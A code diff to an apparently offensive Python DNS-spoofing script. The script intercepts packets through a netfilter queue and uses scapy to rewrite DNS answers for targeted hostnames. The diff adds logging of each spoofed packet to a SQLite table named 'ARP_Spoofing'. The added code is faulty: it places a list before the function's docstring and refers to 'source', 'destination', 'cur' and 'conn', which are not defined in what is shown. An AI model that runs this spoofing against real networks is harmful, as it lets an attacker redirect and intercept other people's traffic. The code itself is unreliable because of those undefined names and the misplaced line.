@@ -42,6 +42,7 @@ def modify_packet(packet):
 
 
 def process_packet(packet):
+    dlist = [source, destination]
     """
     Whenever a new packet is redirected to the netfilter queue,
     this callback is called.
@@ -53,12 +54,18 @@ def process_packet(packet):
         # modify the packet
         if scapy_packet[DNSQR].qname in dns_hosts:
             print("[Before]:", scapy_packet.summary())
+            dlist.append(scapy_packet.summary())
             try:
                 scapy_packet = modify_packet(scapy_packet)
             except IndexError:
                 # not UDP packet, this can be IPerror/UDPerror packets
                 pass
             print("[After ]:", scapy_packet.summary())
+            dlist.append(scapy_packet.summary())
+            cur.execute('''INSERT INTO ARP_Spoofing (id, Source, Destination, Before, After) 
+            VALUES (NULL, ?, ?, ?, ?)
+             ''', dlist)
+            conn.commit()
             # set back as netfilter queue packet
             packet.set_payload(bytes(scapy_packet))
     # accept the packet
